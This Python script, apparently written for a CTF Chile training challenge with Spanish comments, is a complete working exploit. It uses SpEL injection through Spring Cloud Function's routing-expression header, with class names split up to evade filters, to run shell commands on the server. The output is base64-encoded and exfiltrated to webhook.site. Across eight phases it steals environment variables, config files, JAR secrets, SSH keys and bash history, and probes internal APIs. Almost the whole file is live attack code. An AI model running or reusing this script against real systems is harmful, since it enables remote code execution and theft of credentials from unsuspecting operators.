#!/usr/bin/env python3
"""
CTF Chile - Buscar credenciales locales para servicios internos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Buscando credenciales para servicios internos...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:40} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Buscar archivos de configuración específicos...")

# Buscar archivos de configuración que podrían tener tokens/keys
config_files = [
    "/app/config.json", "/app/settings.json", "/app/.env",
    "/app/application.properties", "/app/bootstrap.yml",
    "/root/.config", "/etc/app", "/opt/config"
]

for config_file in config_files:
    file_safe = config_file.replace("/", "_").replace(".", "_")
    probe(f"config_{file_safe}", f"cat {config_file} 2>/dev/null || echo 'NOT_FOUND_{config_file}'")

print("[*] FASE 2: Extraer más información del JAR de la aplicación...")

# Extraer archivos específicos del JAR que podrían tener credenciales
probe("jar_extract_all", "cd /tmp && rm -rf app_extract && mkdir app_extract && cd app_extract && unzip -q /app/app.jar && find . -type f | head -20")
probe("jar_properties", "cd /tmp && unzip -p /app/app.jar '*.properties' '*.yml' '*.yaml' '*.conf' 2>/dev/null | head -20")
probe("jar_secrets", "strings /app/app.jar | grep -i -E '(api_key|secret|token|password|credential)' | head -10")

print("[*] FASE 3: Buscar variables de entorno y procesos...")

# Buscar más información de entorno
probe("full_env", "env | sort")
probe("process_env", "cat /proc/1/environ | tr '\\0' '\\n' | sort")
probe("current_user", "whoami && id && groups")

print("[*] FASE 4: Buscar archivos ocultos y de configuración...")

# Buscar archivos ocultos que podrían contener credenciales
probe("hidden_files_root", "find / -name '.*' -type f 2>/dev/null | grep -v proc | head -15")
probe("ssh_config_files", "find / -name 'ssh_config' -o -name 'sshd_config' -o -name 'authorized_keys' 2>/dev/null | xargs cat 2>/dev/null")

print("[*] FASE 5: Buscar archivos relacionados con APIs...")

# Buscar archivos que podrían contener información sobre las APIs
probe("api_files", "find / -name '*api*' -o -name '*token*' -o -name '*key*' -type f 2>/dev/null | grep -v proc | head -10")
probe("curl_history", "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep curl | head -5")

print("[*] FASE 6: Verificar logs que podrían tener información...")

# Revisar logs que podrían mostrar cómo usar las APIs
probe("app_logs", "find / -name '*.log' -type f 2>/dev/null | head -5 | xargs tail -n 5 2>/dev/null")
probe("system_logs", "tail -n 10 /var/log/auth.log /var/log/syslog 2>/dev/null")

print("[*] FASE 7: Buscar información de red específica...")

# Obtener más información sobre la configuración de red
probe("network_config", "cat /etc/hosts /etc/hostname /etc/resolv.conf")
probe("network_connections", "netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null")

print("[*] FASE 8: Intentar conectarse a las APIs desde el container actual...")

# Probar conectarse a las APIs directamente desde el container
probe("direct_api_test", "curl -s -I http://10.160.209.1:8000/ | head -3")
probe("direct_execute_test", "curl -s -v http://10.160.209.1:8000/execute 2>&1 | head -8")

time.sleep(25)

# Recoger y analizar respuestas
print("\n[*] Analizando credenciales locales...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=40", timeout=20)
data = r.json().get("data", [])

credentials_found = []
config_data = []
api_clues = []
flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar credenciales o tokens
            if any(keyword in decoded.lower() for keyword in ["token", "api_key", "secret", "password", "credential"]):
                if "=" in decoded and len(decoded.strip()) < 500:
                    credentials_found.append((path, decoded))
                    print("🔑 CREDENCIALES DETECTADAS")

            # Detectar datos de configuración
            if any(keyword in decoded.lower() for keyword in ["config", "properties", "yml", "json"]):
                if len(decoded.strip()) > 30 and len(decoded.strip()) < 800:
                    config_data.append((path, decoded))
                    print("⚙️ DATOS DE CONFIGURACIÓN")

            # Detectar pistas sobre APIs
            if any(keyword in decoded.lower() for keyword in ["http", "api", "curl", "execute", "10.160", "10.109"]):
                if len(decoded.strip()) > 20 and len(decoded.strip()) < 300:
                    api_clues.append((path, decoded))
                    print("🔗 PISTA SOBRE APIS")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE CREDENCIALES LOCALES")
print("="*70)

if credentials_found:
    print(f"🔑 CREDENCIALES ENCONTRADAS: {len(credentials_found)}")
    for path, content in credentials_found:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if config_data:
    print(f"\n⚙️ DATOS DE CONFIGURACIÓN: {len(config_data)}")
    for path, content in config_data:
        print(f"    - {path}: {content[:100]}...")

if api_clues:
    print(f"\n🔗 PISTAS SOBRE APIS: {len(api_clues)}")
    for path, content in api_clues:
        print(f"    - {path}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 Continuar búsqueda de métodos de autenticación alternativos.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")